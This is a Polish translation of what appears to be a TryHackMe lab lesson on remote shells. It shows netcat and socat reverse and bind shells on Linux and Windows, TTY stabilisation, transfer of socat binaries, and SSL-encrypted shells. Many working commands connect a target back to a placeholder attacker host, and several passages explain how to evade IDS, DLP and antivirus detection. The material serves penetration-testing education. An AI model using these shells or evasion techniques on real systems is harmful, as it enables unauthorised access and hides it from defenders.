---

W wielu rzeczywistych ocenach drobny błąd staje się punktem zaczepienia. Wyobraź sobie funkcję przesyłania plików, która nie sprawdza prawidłowo typu zawartości. Wprowadzasz mały skrypt, uruchamiasz go i nagle następuje **zdalne wykonanie kodu (RCE)** . Ale RCE Samodzielne działanie to nie wszystko – nadal potrzebujesz **zdalnej powłoki** do kontrolowania, stabilizowania i aktualizacji, aby móc wyliczać, obracać i eskalować uprawnienia. Ta sala nauczy Cię praktycznego rzemiosła przechwytywania, używania i wzmacniania powłok, abyś mógł przejść od etapu „kod jest uruchamiany” do etapu „to ja jestem właścicielem tego komputera”.

Powłoka to środowisko wiersza poleceń, które komunikuje się z systemem operacyjnym. Na Twoim komputerze jest to lokalna powłoka (np.  **w**`bash` systemie Linux  `cmd.exe`lub  `PowerShell`Windows). W przypadku zabezpieczeń ofensywnych celem jest uzyskanie **zdalnej powłoki** na komputerze docelowym, aby móc uruchamiać tam polecenia z hosta atakującego. Początkowe powłoki są zazwyczaj nieinteraktywne („półpowłoki”): nie mają funkcji uzupełniania za pomocą klawisza Tab, kontroli nad zadaniami, nie działają na nich znaki  `su`/ `ssh`i nie mają poprawnego TTY. Naprawimy to.

## Cele edukacyjne

- Zrozum różnicę między powłokami odwrotnymi i wiążącymi oraz kiedy każda z nich jest odpowiednia
- Używaj `nc`i  `socat`niezawodnie zakładaj powłoki
- Stabilizacja powłok w pełni interaktywne terminale TTY (Python, `rlwrap`socat-PTY)
- Najpierw przećwicz wszystko na Linuksie, a następnie powtórz wzorce klawiszy na Windowsie

## Wymagania wstępne

W tym pokoju zakładana jest podstawowa wiedza na temat:

- Podstawowy interfejs wiersza poleceń systemu Linux (cd/ls/cat, uprawnienia do plików, procesy)
- Podstawy sieci (IP/porty, TCP vs UDP, nasłuchiwanie vs łączenie)

Podczas tworzenia zdalnych powłok, kierunek połączenia sieciowego ma znaczenie.  **Powłoka odwrotna** występuje, gdy cel (zaatakowany komputer) inicjuje połączenie wychodzące z Twoim odbiornikiem; jest to często skuteczne, gdyzapora sieciowablokuje połączenia przychodzące do celu.  **Powłoka wiążąca** to sytuacja, w której cel otwiera port nasłuchujący i czeka na połączenie; eliminuje to konieczność akceptowania ruchu przychodzącego, ale celzapora sieciowamoże je zablokować. Oba umożliwiają zdalne wykonywanie poleceń, a w praktyce częściej używa się powłok odwrotnych.

## Zrozumienie przepływu połączenia

Kluczowa różnica między powłokami odwrotnymi i wiążącymi polega na tym, kto inicjuje połączenie:

![Diagram przedstawiający różnicę między powłokami odwróconymi a powłokami wiążącymi. W powłoce odwróconej komputer docelowy inicjuje połączenie z atakującym, który nasłuchuje poleceniem nc -lvnp 4444. W powłoce wiążącej komputer docelowy otwiera program nasłuchujący (nc -lvnp 8080), a atakujący nawiązuje z nim połączenie.|700](https://cdn-images.tryhackme.com/user-uploads/6808d44047ac5684351c94da/room-content/6808d44047ac5684351c94da-1777034274326.png)

Zrozumienie tej fundamentalnej różnicy jest istotne, ponieważ ma ona wpływ na to, jakie podejście sprawdzi się w różnych środowiskach sieciowych i konfiguracjach zabezpieczeń.

## Przykład odwróconej powłoki (Linux)

W powłoce odwróconej uruchamiasz program nasłuchujący na atakującej maszynie, a następnie cel łączy się z Tobą. Jest to najczęstsze podejście, ponieważ połączenia wychodzące są zazwyczaj mniej ograniczone niż połączenia przychodzące.

Uruchom podstawowy program nasłuchujący na swojej maszynie atakującej:

Atakujący Słuchacz

```shell-session
attacker@tryhackme:~$ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

Następnie wykonaj polecenie połączenia na obiekcie docelowym, które wywoła odpowiedź do Twojego odbiornika:

Docelowa odwrócona skorupa

```shell-session
target@victim:~$ nc CONNECTION_IP 4444 -e /bin/bash
```

Twój program nasłuchujący odbiera połączenie i udostępnia dostęp do powłoki docelowej:

Połączenie odwrotnej powłoki

```shell-session
Connection received on 10.6.47.58 50983
whoami
shell-user
```

## Przykład powłoki Bind (Linux)

W powłoce bind, cel tworzy nasłuchiwacza podłączonego do powłoki, a Ty łączysz się z nim z komputera atakującego. Powoduje to odwrócenie kierunku połączenia, ale może zostać zablokowane przez zapory sieciowe ograniczające dostęp przychodzący.

Na komputerze docelowym utwórz obiekt nasłuchujący, który oferuje dostęp do powłoki:

Nasłuchiwacz powłoki docelowej Bind

```shell-session
target@victim:~$ nc -lvnp 8080 -e /bin/bash
listening on [any] 8080 ...
```

Z maszyny atakującej połącz się z nasłuchiwaczem celu:

Łączenie z powłoką Bind

```shell-session
attacker@tryhackme:~$ nc MACHINE_IP 8080
whoami
shell-user
```

## Dlaczego kierunek ma znaczenie

Wybór pomiędzy powłoką odwrotną a powłoką wiążącą zależy od konfiguracji zabezpieczeń sieci:

**Powłoki odwrócone działają najlepiej, gdy:**

- Cel może nawiązywać połączenia wychodzące (najczęstszy scenariusz)
- Zapory sieciowe blokują połączenia przychodzące do celu
- Cel znajduje się za NAT (translacją adresów sieciowych) bez przekierowania portów
- Chcesz kontrolować port nasłuchujący na swoim komputerze

**Powłoki wiążące działają najlepiej, gdy:**

- Połączenia wychodzące z celu są mocno ograniczone
- Nie możesz akceptować połączeń przychodzących na swoim komputerze
- Cel ma dostępne porty (przezzapora sieciowa(zasady lub przekierowanie portów)
- Do uzyskania dostępu do tej samej powłoki potrzebnych jest wiele osób

Odwrócone powłoki są używane znacznie częściej, ponieważ większość sieci zezwala na ruch wychodzący, ale ogranicza dostęp przychodzący. Jednak zrozumienie obu podejść daje Ci możliwość wyboru, gdy jedna z metod jest zablokowana.

Po uzyskaniu możliwości wykonania kodu na celu, nadal potrzebujesz niezawodnego sposobu na przechwycenie i użycie tej powłoki. Powłoki typu „reverse” i „bind” stają się przydatne tylko w połączeniu z odpowiednimi narzędziami. To zadanie zapewnia ogólny przegląd podstawowych narzędzi, których będziesz używać w tej sali, ich działania, czasu ich używania i wzajemnego uzupełniania się. Zajmiemy się szczegółowo (i praktycznie) poniższymi zadaniami.

## Netcat

**Netcat** (nc) to szwajcarski scyzoryk wśród narzędzi sieciowych i pierwszy wybór do szybkich połączeń shellowych. Wyobraź sobie go jako prostą rurę, która może nasłuchiwać połączeń przychodzących lub nawiązywać połączenie z innym systemem. Gdy ktoś się łączy, netcat przesyła dane między gniazdem sieciowym a terminalem.

Głównymi zaletami Netcata są jego prostota i powszechność; jest lekki, szybki w konfiguracji i dostępny praktycznie na każdym urządzeniu.LinuxSystem. Za pomocą podstawowego polecenia netcat można nawiązać działające połączenie z powłoką w kilka sekund. Ta prostota ma jednak swoje ograniczenia: Netcat nie zapewnia szyfrowania, oferuje minimalną interaktywność i może wydawać się nieporęczny przy dłuższym użytkowaniu.

Netcat to narzędzie, które sprawdzi działanie powłoki i umożliwi szybki dostęp podczas wstępnej rewizji. Potrzebujesz przetestować łączność, przenieść plik lub uzyskać podstawowe informacje przed aktualizacją? Netcat się tym zajmie.

## rlwrap

**Rlwrap** (readline wrapper) rozwiązuje jeden z największych problemów Netcata: brak historii poleceń i funkcji edycji wiersza. Surowe powłoki Netcata nie reagują na klawisze strzałek, nie zapamiętują poprzednich poleceń i nie obsługują uzupełniania za pomocą klawisza Tab. Rlwrap opakowuje Netcata, dodając brakujące funkcje readline.

Wystarczy dodać prefiks do polecenia nasłuchiwania netcata `rlwrap`, a powłoka natychmiast zyskuje dostęp do historii poleceń, nawigacji za pomocą klawiszy strzałek i podstawowej edycji wiersza. W przypadku dłuższych sesji, podczas których uruchamiasz dziesiątki poleceń, różnica jest kolosalna.

## Socat

**Socat** (SOcket CAT) oferuje wszystko to, co netcat, a nawet więcej. Podczas gdy netcat jedynie przesyła surowe bajty między dwoma punktami końcowymi, socat może manipulować przepływem danych, przydzielać terminale i szyfrować połączenia.

Funkcja, która będzie dla Ciebie najważniejsza, to przydzielanie PTY (pseudoterminali). PTY sprawia, że ​​Twoja powłoka zachowuje się jak prawdziwa sesja terminalowa, z odpowiednią obsługą sygnałów, kontrolą zadań i obsługą programów interaktywnych, takich jak edytory tekstu. Socat może również szyfrować połączenia za pomocą SSL/TLS, dzięki czemu ruch powłoki jest nieodróżnialny od legalnej komunikacji HTTPS.

Socat sprawdza się, gdy potrzebujesz stabilności i dyskretności. Jego alokacja PTY tworzy powłoki, które uruchamiają złożone programy interaktywne, prawidłowo obsługują przerwania Ctrl+C i obsługują funkcje kontroli zadań, takie jak procesy w tle. Funkcje szyfrowania pomagają unikać systemów monitorowania i wykrywania sieci, które mogą sygnalizować ruch powłoki w postaci zwykłego tekstu.

Główną wadą jest to, że socat nie zawsze jest preinstalowany na systemach docelowych, w przeciwieństwie do netcata. Jednak statyczne pliki binarne często można przenieść na etapie początkowego dostępu.

## Msfvenom i Metasploit multi/handler

**Msfvenom** i **Metasploit** `multi/handler` oferują funkcje klasy korporacyjnej do generowania i obsługi ładunków. Msfvenom generuje ładunki w różnych formatach (pliki wykonywalne, skrypty, kod powłoki) dla różnych platform, podczas gdy multi/handler oferuje zaawansowany moduł nasłuchu, który rozumie zaawansowane protokoły ładunków.

Ta kombinacja sprawdza się znakomicie, gdy potrzebna jest kompatybilność międzyplatformowa, ładunki etapowe lub zaawansowane funkcje poeksploatacyjne, takie jak**Meterpreter**Ładunki etapowe są szczególnie przydatne w środowiskach z ograniczeniami rozmiaru; po nawiązaniu początkowego połączenia pobierają i wykonują cały ładunek.Meterpreterzapewnia zaawansowane środowisko powłoki z wbudowanymi modułami do eskalacji uprawnień, przemieszczania się w poziomie i eksfiltracji danych.

TenMetasploitFramework automatycznie obsługuje również techniki kodowania i unikania ataków, pomagając ominąć systemy antywirusowe i systemy wykrywania punktów końcowych. Multi/handler może zarządzać wieloma równoczesnymi sesjami i zapewnia funkcje zarządzania sesjami, których nie są w stanie zapewnić proste programy nasłuchujące NetCat.

Kompromisem jest złożoność i wykorzystanie zasobów.Metasploitwymaga więcej czasu konfiguracji i zasobów systemowych niż lekkie narzędzia typu Netcat, przez co lepiej nadaje się do zaplanowanych operacji niż do szybkiego, okazjonalnego dostępu.

## Jak te narzędzia się uzupełniają

Narzędzia te tworzą progresję od prostych do zaawansowanych, przy czym każde z nich bazuje na możliwościach poprzedniego:

- **Netcat** stanowi podstawę szybkiej, uniwersalnej łączności z powłoką, która działa wszędzie. Użyj go, aby udowodnić, że dostęp do powłoki jest możliwy, oraz w scenariuszach szybkiego dostępu początkowego.
- **Rlwrap** usprawnia działanie netcata, dodając niezbędne funkcje użyteczności. Otocz swoje programy nasłuchujące netcata za pomocą rlwrap, gdy planujesz używać powłoki do czegoś więcej niż tylko wykonywania podstawowych poleceń.
- **Socat** zapewnia profesjonalną stabilność i bezpieczeństwo powłoki. Przejdź na Socat, gdy potrzebujesz niezawodnego, długoterminowego dostępu, interaktywnego wsparcia programu lub szyfrowanej komunikacji.
- **Msfvenom i multi/handler** zapewniają możliwości korporacyjne w przypadku złożonych scenariuszy. Wybierz tę kombinację, gdy potrzebujesz wieloplatformowych ładunków, zaawansowanego unikania ataków lub frameworków poeksploatacyjnych.

W praktyce możesz zacząć od netcat, aby nawiązać początkowy dostęp, następnie dokonać aktualizacji do rlwrap w celu poprawy użyteczności, przejść do socat w celu zapewnienia stabilności, a na końcu użyćMetasploitdo zaawansowanych działań poeksploatacyjnych. Każde narzędzie ma swoje miejsce w zestawie narzędzi testera penetracyjnego.

## Następne kroki

Poniższe zadania przeprowadzą Cię przez praktyczne implementacje tych narzędzi. Zaczniesz od podstaw Netcata, przejdziesz przez zaawansowane funkcje Socata, poznasz techniki stabilizacji powłoki, a skończysz na szyfrowanej komunikacji. Każde narzędzie ma swoje miejsce w zestawie narzędzi testera penetracyjnego, a praktyka to najszybszy sposób na rozwinięcie biegłości.

W poprzednim zadaniu dowiedziałeś się, że powłoki netcat mogą być niestabilne i nie mieć kontroli nad zadaniami. `socat`(SOcket CAT) rozwiązuje te problemy. Potrafi przekazywać dane między dwoma punktami końcowymi, przydzielać pseudoterminale, a nawet opakowywać połączenia w SSL. Ponieważ `socat`jest bardziej rozbudowany niż netcat, nie zawsze jest preinstalowany na komputerach docelowych. W tym zadaniu zobaczysz, jak używać SOCAT do tworzenia podstawowych powłok i aktualizacji do właściwego TTY.

## Podstawowe odwrócone muszle z socat

Socat używa innej składni niż netcat, ale koncepcja pozostaje ta sama. Zamiast prostych flag, socat używa „specyfikacji adresów”, które opisują punkty końcowe i ich właściwości. Podstawowy format to `socat [options] address1 address2`, gdzie dane przepływają między dwoma adresami.

Rozpocznij nasłuchiwanie w polu ataku, używając `TCP-L`(TCPTyp adresu „Nasłuchuj”. Myślnik ( `-`) reprezentuje standardowe wejście/wyjście, co oznacza, że ​​socat wyświetli dane przychodzące na Twoim terminalu:

Słuchacz Socat

```shell-session
attacker@tryhackme:~$ socat TCP-L:443 -
```

Na komputerze docelowym połącz się ponownie za pomocą komendy „docelowej `TCP:host:port`”, aby określić miejsce docelowe i `EXEC:`uruchomić program po nawiązaniu połączenia. `bash -li`Generuje ona interaktywną powłokę logowania, która zapewnia bardziej kompletne środowisko niż powłoka podstawowa:

Target Socat Reverse Shell

```shell-session
target@victim:~$ socat TCP:CONNECTION_IP:443 EXEC:"bash -li"
```

## Odwróć powłoki systemu Windows

Socat działa równie dobrze w systemach Windows. Zastąp `bash`plikami wykonywalnymi powłoki systemu Windows i dodaj opcję „pipes”, aby poprawnie obsługiwać nazwane potoki systemu Windows do przekierowywania wejścia/wyjścia:

Odwrotna powłoka systemu Windows

```shell-session
C:\> socat TCP:CONNECTION_IP:443 EXEC:powershell.exe,pipes
```

Można również użyć `cmd.exe,pipes`tradycyjnej powłoki wiersza poleceń zamiast programu PowerShell.

## Podstawowe powłoki Bind z socat

Powłoki binarne odwracają kierunek połączenia. Cel nasłuchuje połączeń przychodzących, podczas gdy Ty łączysz się z atakującego komputera. To podejście działa, gdy połączenia wychodzące są blokowane, ale dostęp przychodzący jest możliwy na określonych portach.

Na celu użyj, `TCP-L`aby nasłuchiwać i `EXEC`utworzyć powłokę, gdy ktoś się połączy:

Cel Socat Bind Shell

```shell-session
target@victim:~$ socat TCP-L:8088 EXEC:"bash -li"
listening on 0.0.0.0:8088 ...
```

Z pola ataku możesz połączyć się z nasłuchiwaczem celu. Adres `TCP:host:port`łączy się ze zdalną usługą, a myślnik przekazuje połączenie do twojego terminala:

Łączenie z powłoką Socat Bind

```shell-session
attacker@tryhackme:~$ socat TCP:MACHINE_IP:8088 -
whoami
shell
pwd
/home/shell
```

## Powłoki powiązań systemu Windows

W przypadku systemów docelowych Windows należy określić odpowiedni plik wykonywalny powłoki i uwzględnić opcję `pipes`prawidłowej obsługi wejścia/wyjścia:

Powłoka wiązania systemu Windows

```shell-session
C:\> socat TCP-L:8088 EXEC:cmd.exe,pipes
```

Surowa powłoka Netcata często wydaje się krucha: nie można używać klawiszy strzałek ani uzupełniania za pomocą klawisza Tab, programy takie jak `ssh`i `su`działają nieprawidłowo, a przypadkowe naciśnięcie Ctrl+C może przerwać sesję. Aby praca po awarii była bardziej komfortowa, musimy **ustabilizować** nasze powłoki i uzyskać odpowiedni TTY. Poniżej przedstawiamy trzy techniki, które można zastosować w systemach Linux i Windows.

## Tworzenie TTY za pomocą Pythona

W wielu systemach Linux Python jest domyślnie zainstalowany. `pty`Moduł (pseudoterminal) może utworzyć interaktywną powłokę przypominającą prawdziwą sesję terminala.TTYzapewnia właściwą obsługę wejścia/wyjścia i umożliwia korzystanie z takich funkcji jak kontrola zadań.

Przed rozpoczęciem zanotuj wymiary swojego lokalnego terminala — będą Ci potrzebne po wejściu do ustabilizowanej powłoki. Uruchom `stty size`na komputerze atakującego i miej te wartości pod ręką:

Sprawdzanie rozmiaru terminala

```shell-session
attacker@tryhackme:~$ stty size
50 220
```

Utwórz powłokę odwrotną Netcata na komputerze docelowym. Uruchom program nasłuchujący na maszynie atakującego:

Nasłuchiwacz Netcat

```shell-session
attacker@tryhackme:~$ nc -lvnp 4444
listening on [any] 4444 ...
```

Następnie uruchom odwrotny pocisk z celu:

Docelowa odwrócona skorupa

```shell-session
target@victim:~$ nc CONNECTION_IP 4444 -e /bin/bash
```

Gdy już masz podstawową powłokę netcat, udoskonal ją, importując moduł pty Pythona i uruchamiając proces bash:

Python TTY Spawn

```shell-session
attacker@tryhackme:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
target@victim:~$
```

Funkcja `pty.spawn()`tworzy pseudoterminal i uruchamia `/bin/bash`w nim określony program ( ). To natychmiast zapewnia bardziej interaktywną powłokę, w której programy zachowują się normalnie.

Następnie ustaw zmienną środowiskową „Typ terminala”, aby programy mogły poprawnie formatować dane wyjściowe. Ten `xterm`typ terminala jest szeroko obsługiwany i zapewnia dobrą kompatybilność:

Ustawianie typu terminala

```shell-session
target@victim:~$ export TERM=xterm
```

Aby zakończyć stabilizację, musisz skonfigurować swój terminal lokalny. Możesz zawiesić powłokę za pomocą Ctrl+Z, a następnie uruchomić ją `stty raw -echo`na komputerze atakującego. Ta  `raw`opcja wyłącza przetwarzanie danych wejściowych (wysyła wszystkie naciśnięcia klawiszy bezpośrednio), jednocześnie  `-echo`uniemożliwiając komputerowi wyświetlanie wpisywanych znaków (unikając duplikowania znaków). Wznów powłokę za pomocą  `fg`:

Stabilizacja powłoki

```shell-session
^Z
[1]+  Stopped                 nc -lvnp 4444
attacker@tryhackme:~$ stty raw -echo
attacker@tryhackme:~$ fg
```

Wróć do powłoki docelowej i zastosuj wymiary, które zanotowałeś wcześniej. Zastąp wartości wierszy i kolumn z `stty size`wyników:

Ustaw rozmiar terminala

```shell-session
target@victim:~$ stty rows 50 cols 220
```

Po wyjściu z powłoki docelowej terminal lokalny pozostaje w trybie surowym (raw) z poprzedniego stanu `stty raw -echo`. Uruchom  `stty sane`, aby przywrócić normalne działanie. Jeśli połączenie zostanie nieoczekiwanie zerwane, gdy aktywny jest tryb surowy, wpisz  `reset`i naciśnij Enter, nawet jeśli nic się nie pojawi podczas pisania.

## Opakowanie słuchacza za pomocą rlwrap

Chociaż pty Pythona udostępnia funkcjonalny terminal TTY, nadal brakuje historii poleceń i uzupełniania klawiszem Tab. `rlwrap`(wrapper readline) dodaje funkcjonalność GNU readline do dowolnego programu, zapewniając te brakujące funkcje.

Zainstaluj rlwrap, jeśli jest niedostępny ( `sudo apt install rlwrap`), a następnie opakuj nasłuchiwacza Netcata.  `rlwrap`Polecenie przechwytuje dane wejściowe/wyjściowe i dodaje funkcje readline przed przekazaniem danych do Netcata:

Nasłuchiwacz Rlwrap

```shell-session
attacker@tryhackme:~$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

Po połączeniu z powłoką odwrotną wykonaj te same kroki stabilizacji w Pythonie: utwórz terminal TTY za pomocą `pty.spawn("/bin/bash")`, wyeksportuj `TERM=xterm`i skonfiguruj terminal lokalny za pomocą  `stty raw -echo`. Różnica polega na tym, że rlwrap udostępnia teraz historię poleceń (strzałki w górę/w dół) i podstawowe uzupełnianie za pomocą klawisza Tab, dzięki czemu powłoka jest znacznie bardziej użyteczna podczas dłuższych sesji.

## Aktualizacja do w pełni interaktywnej powłoki z Socat

Aby zapewnić najwyższą stabilność powłoki, socat może przydzielić odpowiedni pseudoterminal z pełną obsługą sygnałów i kontrolą zadań. Jeśli socat nie jest zainstalowany na komputerze docelowym, można go przenieść za pośrednictwem istniejącego połączenia powłoki.

Najpierw udostępnij plik binarny socat z komputera atakującego. Wbudowany serwer HTTP Pythona ułatwia przesyłanie plików. Moduł `-m http.server`tworzy serwer WWW udostępniający pliki z bieżącego katalogu:

PytonHTTPSerwer

```shell-session
attacker@tryhackme:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Pobierz socat do celu za pomocą istniejącej powłoki. W systemach Linux `wget`pobiera pliki przez HTTP. Opcja  `-O`określa nazwę pliku wyjściowego i  `chmod +x`sprawia, że ​​plik binarny staje się wykonywalny:

Pobieranie Socata

```shell-session
target@victim:~$ wget http://CONNECTION_IP/socat -O /tmp/socat
target@victim:~$ chmod +x /tmp/socat
```

## Transfer plików systemu Windows

`Invoke-WebRequest`W systemach Windows do pobierania plików  użyj polecenia cmdlet programu PowerShell . `-Uri`Parametr określa źródłowy adres URL, a `-OutFile`ścieżka docelowa jest ustawiana:

Transfer plików programu PowerShell

```powershell
PS> Invoke-WebRequest -Uri http://CONNECTION_IP/socat.exe -OutFile C:\Windows\Temp\socat.exe
```

## Ustanawianie powłoki Socat TTY

Gdy socat będzie dostępny, utwórz w pełni interaktywną powłokę. Uruchom program nasłuchujący, który łączy się z komputerem atakującego. `` FILE:`tty` ``Typ adresu łączy się z terminalem,  `raw`tryb przekazuje wszystkie dane wejściowe bezpośrednio i  `echo=0`wyłącza lokalne echo:

Nasłuchiwacz TTY Socat

```shell-session
attacker@tryhackme:~$ socat TCP-L:5555 FILE:`tty`,raw,echo=0
```

Na celu połącz się ponownie z pełnymTTYOpcje. `EXEC:"bash -li"`Uruchamia interaktywną powłokę logowania, a dodatkowe opcje tworzą odpowiednie środowisko terminala:

Połączenie Socat TTY

```shell-session
target@victim:~$ /tmp/socat TCP:CONNECTION_IP:5555 \
EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

To polecenie socat tworzy najstabilniejszą powłokę, jaka jest możliwa:

- **`pty`:** Przydziela pseudoterminal do prawidłowej interakcji z programem
- **`stderr`:** Przekazuje dane wyjściowe błędów, aby wyświetlić wszystkie komunikaty programu
- **`sigint`:** Włącza obsługę sygnału Ctrl+C w celu przerwania procesu
- **`setsid`:** Tworzy nową sesję w celu prawidłowej kontroli zadań
- **`sane`:** Zastosowuje standardowe ustawienia terminala w celu zapewnienia spójnego działania

Na tym etapie powłoka działa równie dobrze, co bezpośrednie logowanie SSH. Możesz uruchamiać `vim`procesy w tle za pomocą Ctrl+Z i normalnie korzystać z uzupełniania za pomocą klawisza Tab.

Chociaż podstawowe powłoki zapewniają zdalny dostęp, przesyłają wszystkie dane w postaci zwykłego tekstu przez sieć. Stwarza to ryzyko: narzędzia do monitorowania sieci mogą wykrywać ruch w powłoce, systemy wykrywania włamań mogą sygnalizować podejrzane połączenia, a zapobieganie utracie danych (DLP) Systemy mogą sprawdzać Twoje polecenia. Szyfrowane powłoki opakowują Twój ruch w SSL/TLS, dzięki czemu ruch HTTPS wydaje się legalny, a jednocześnie ukrywa faktyczne polecenia powłoki.

## Dlaczego warto szyfrować ruch Shell?

Szyfrowanie służy wielu celom w scenariuszach poeksploatacyjnych. Obrońcy sieci często monitorują podejrzane protokoły tekstowe na nietypowych portach. Połączenie netcat z portem 4444 natychmiast wzbudza podejrzenia. Jednak ruch SSL na portach 443 (HTTPS) lub 8443 wydaje się normalny i łączy się z legalnym ruchem internetowym.

Ponadto wiele organizacji wdraża DLP Rozwiązania, które sprawdzają ruch sieciowy pod kątem wrażliwych danych lub podejrzanych poleceń. Szyfrowane powłoki uniemożliwiają inspekcję zawartości, omijając te zabezpieczenia. Wreszcie, niektóre struktury zgodności wymagają szyfrowania połączeń administracyjnych, co sprawia, że ​​szyfrowane powłoki są niezbędne w określonych środowiskach.

## Generowanie i zarządzanie certyfikatami

SSL/TLSSzyfrowanie wymaga certyfikatów do nawiązywania bezpiecznych połączeń. Na potrzeby powłoki można tworzyć certyfikaty z podpisem własnym, które zapewniają szyfrowanie bez udziału urzędu certyfikacji. System docelowy zaakceptuje te certyfikaty po wyłączeniu weryfikacji.

Wygeneruj certyfikat i klucz prywatny za pomocą OpenSSL. Polecenie `req`tworzy żądanie podpisania certyfikatu i  `--newkey rsa:2048`generuje 2048-bitowyRSApara kluczy,  `-nodes`tworzy niezaszyfrowany klucz prywatny (bez hasła) i  `-x509`zamiast żądania wyprowadza certyfikat podpisany przez siebie:

Generowanie certyfikatu

```shell-session
attacker@tryhackme:~$ openssl req -newkey rsa:2048 -nodes \
-keyout shell.key -x509 -days 365 -out shell.crt
Generating a RSA private key
.......+++++
............................+++++
writing new private key to 'shell.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
[...certificate details prompts...]
```

Ta `-days 365`opcja ustawia okres ważności certyfikatu na jeden rok. W monitach o certyfikat możesz wprowadzić dowolne wartości lub nacisnąć Enter, aby użyć ustawień domyślnych. Zawartość nie ma znaczenia dla szyfrowania powłoki.

Połącz certyfikat i klucz prywatny w jeden plik PEM, z którego może korzystać Socat. Format PEM zawiera oba komponenty w jednym pliku, co ułatwia zarządzanie:

Tworzenie pliku PEM

```shell-session
attacker@tryhackme:~$ cat shell.key shell.crt > shell.pem
attacker@tryhackme:~$ ls -la shell.*
-rw-r--r-- 1 attacker attacker 1350 Dec 15 10:30 shell.crt
-rw------- 1 attacker attacker 1708 Dec 15 10:30 shell.key
-rw-r--r-- 1 attacker attacker 3058 Dec 15 10:30 shell.pem
```

## Zaszyfrowane odwrotne powłoki

Szyfrowane powłoki odwrotne wykorzystują obsługę OpenSSL w SoCat do pakowania połączeń w TLS. Uruchom nasłuchiwacz z włączonym SSL, używając `OPENSSL-LISTEN`typu adresu. Ta  `cert=shell.pem`opcja określa plik certyfikatu, jednocześnie  `verify=0`wyłączając weryfikację certyfikatu klienta:

Zaszyfrowany odbiornik

```shell-session
attacker@tryhackme:~$ socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -
listening on 0.0.0.0:443
```

Na urządzeniu docelowym połącz się ponownie, używając `OPENSSL`typu adresu, aby nawiązać szyfrowane połączenie. `verify=0`Opcja ta nakazuje programowi socat akceptować certyfikaty podpisane przez siebie bez walidacji:

Zaszyfrowana odwrotna powłoka

```shell-session
target@victim:~$ socat OPENSSL:CONNECTION_IP:443,verify=0 EXEC:/bin/bash
```

Połączenie jest teraz widoczne jako ruch SSL do narzędzi monitorujących sieć. Wszystkie polecenia powłoki, odpowiedzi i transfery plików są szyfrowane w trakcie przesyłania, co uniemożliwia systemom bezpieczeństwa sprawdzenie ich zawartości.

## Szyfrowane odwrotne powłoki systemu Windows

Docelowe obiekty systemu Windows wymagają różnych plików wykonywalnych powłoki, ale używają tej samej składni SSL. Użyj opcji  `cmd.exe`lub,  aby zapewnić prawidłową obsługę wejścia/wyjścia:`powershell.exe``pipes`

Szyfrowana odwrotna powłoka systemu Windows

```shell-session
C:\> socat OPENSSL:CONNECTION_IP:443,verify=0 EXEC:powershell.exe,pipes
```

## Zaszyfrowane powłoki Bind

Szyfrowane powłoki bind odwracają kierunek połączenia, zachowując jednocześnie szyfrowanie SSL. Cel nasłuchuje z włączonym SSL, a Ty łączysz się z maszyny atakującej. To podejście działa, gdy wychodzące połączenia SSL są zablokowane, ale przychodzące połączenia HTTPS są dozwolone.

Utwórz nasłuchiwacz SSL na komputerze docelowym, który uruchomi powłokę po nadejściu połączenia. Najpierw musisz przesłać plik certyfikatu do komputera docelowego. Udostępniaj go z komputera atakującego za pomocą serwera HTTP w Pythonie:

Certyfikat hostingu

```shell-session
attacker@tryhackme:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Następnie pobierz certyfikat na urządzenie docelowe:

Pobieranie certyfikatu

```shell-session
target@victim:~$ wget http://CONNECTION_IP/shell.pem -O /tmp/shell.pem
```

Uruchom zaszyfrowany program nasłuchujący powłoki bind, używając przesłanego certyfikatu:

Zaszyfrowany nasłuchiwacz powłoki Bind

```shell-session
target@victim:~$ socat OPENSSL-LISTEN:8443,cert=/tmp/shell.pem,verify=0 EXEC:"bash -li"
listening on 0.0.0.0:8443
```

Połącz się z zaszyfrowaną powłoką bind z komputera atakującego. Połączenie wykorzystuje tryb klienta SSL do połączenia z serwerem SSL celu:

Łączenie z szyfrowaną powłoką Bind Shell

```shell-session
attacker@tryhackme:~$ socat OPENSSL:MACHINE_IP:8443,verify=0 -
target@victim:~$ whoami
victim-user
target@victim:~$ id
uid=1000(victim-user) gid=1000(victim-user) groups=1000(victim-user)
```

## Szyfrowane powłoki powiązań systemu Windows

W przypadku systemów Windows należy przesłać plik certyfikatu za pomocą programu PowerShell i utworzyć program nasłuchujący SSL z odpowiednim plikiem wykonywalnym powłoki:

Szyfrowana powłoka Bind systemu Windows

```powershell
PS> Invoke-WebRequest -Uri http://CONNECTION_IP/shell.pem -OutFile C:\Windows\Temp\shell.pem
PS> socat OPENSSL-LISTEN:8443,cert=C:\Windows\Temp\shell.pem,verify=0 EXEC:cmd.exe,pipes
```

## Szyfrowane powłoki TTY

Połącz szyfrowanie SSL z pełną funkcjonalnością TTY, aby zapewnić sobie najbezpieczniejsze i najbardziej użyteczne środowisko powłoki. Uruchom szyfrowany program nasłuchujący, który łączy się z terminalem z obsługą TTY:

Zaszyfrowany odbiornik TTY

```shell-session
attacker@tryhackme:~$ socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
```

Na celu połącz się z pełnymTTYOpcje szyfrowania SSL. Zapewnia to zarówno bezpieczeństwo, jak i użyteczność:

ZaszyfrowaneTTYPołączenie

```shell-session
target@victim:~$ socat OPENSSL:CONNECTION_IP:443,verify=0 \
EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

Teraz masz szyfrowanie i pełny TTY w jednym połączeniu. Ruch wygląda jak normalny HTTPS dla każdego, kto go obserwuje, a powłoka działa jak bezpośrednie logowanie.

## Rozważania operacyjne

Wybór portu ma znaczenie w rzeczywistych sytuacjach. Port 443 (HTTPS) jest najbezpieczniejszy, ponieważ oczekuje się, że będzie obsługiwał ruch SSL. Porty 8443 i 9443 również wyglądają normalnie dla usług internetowych. Wszystko, co nietypowe, zwróci uwagę.

Certyfikaty można generować na bieżąco, ale wcześniejsze wygenerowanie ich oszczędza czas. W przypadku dłuższych zleceń należy podać realistyczne informacje o organizacji, aby certyfikat nie wzbudzał podejrzeń podczas kontroli.

